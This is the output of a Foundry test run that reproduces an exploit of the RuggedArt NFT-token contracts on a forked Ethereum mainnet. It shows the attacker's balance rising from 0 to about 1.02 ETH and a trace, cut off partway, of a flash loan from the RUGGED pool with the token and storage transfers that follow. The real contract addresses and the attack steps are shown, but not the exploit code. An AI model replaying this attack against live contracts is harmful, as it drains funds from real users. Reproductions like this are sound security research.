No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 0 → 9159
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9e: 6570 → 0
    │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb40f7: 4984 → 4677
    │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 0 → 1
    │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f85: 3270 → 8174
    │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000135457616c058afee0 → 0x0000000000000000000000000000000000000000000000122307adfba2f2fee0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e98: 2052 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e93: 295 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43ed: 8796 → 6452
    │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 0 → 1
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 0 → 7485
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e94: 2078 → 0
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 0 → 9050
    │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 0 → 12
    │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 0 → 1
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea3: 643 → 0
    │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 0 → 1
    │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 0 → 3913
    │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e97: 7882 → 0
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 0 → 7449
    │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 0 → 16
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e96: 4677 → 0
    │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 0 → 6
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 0 → 4090
    │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 0 → 3
    │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 0 → 10
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43a2: 7093 → 7455
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c5e: 1933 → 6719
    │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 0 → 1
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4dca: 9017 → 5669
    │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 0 → 9017
    │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 0 → 20
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d96: 0 → 1933
    │   │   │   @ 0xd7afa6abb1ac288cb75dcd88b595b3d70e5c62f92b144685cd73adda83d552ea: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a55: 3525 → 2052
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e91: 5943 → 0
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 0 → 347
    │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 0 → 2
    │   │   │   @ 5: 4343 → 4321
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea2: 8781 → 0
    │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 0 → 8
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 0 → 6049
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 0 → 3270
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4550: 347 → 8781
    │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 0 → 4903
    │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 0 → 1
    │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 0 → 13
    │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea5: 715 → 0
    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9f: 5185 → 0
    │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
